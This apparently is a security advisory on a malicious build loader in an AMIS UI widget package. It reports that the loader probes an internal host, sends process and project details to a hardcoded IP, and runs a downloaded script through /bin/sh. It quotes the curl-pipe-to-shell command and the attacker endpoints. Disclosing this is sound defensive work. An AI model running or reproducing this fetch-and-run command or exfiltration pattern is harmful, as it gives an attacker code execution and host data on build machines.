summary: Widget loader exfiltrates host context and executes remote shell payload from hardcoded IP
details: dist/bsrc-loader.js, invoked via webpack inline loader syntax when the widget's renderer.umd is bundled, performs three attacker-beneficial actions at build time. First, it issues an HTTP GET to http://bsrc-ssrf.n.baidu-int.com/bsrc_uid (a Baidu-internal SSRF target). Second, it POSTs the response body along with process.pid, process.cwd(), the resolved project root, and a uid — base64url-encoded — as query parameters to a hardcoded external receipt endpoint at http://49.232.169.67:43817/bsrc-r267. Third, on Linux hosts and gated on the internal probe succeeding, it spawns /bin/sh with a payload that runs `curl -fsSL http://49.232.169.67:80/slt || wget... | sh`, piping remote script contents into a shell in a detached process (`sleep 9d`). The destination is a bare-IP, plain-HTTP endpoint unrelated to the package's stated purpose (an AMIS UI widget). The behavior is characteristic of a targeted supply-chain attack aimed at a specific corporate build environment, providing the operator of 49.232.169.67 arbitrary code execution and host reconnaissance on any installer that bundles this widget.
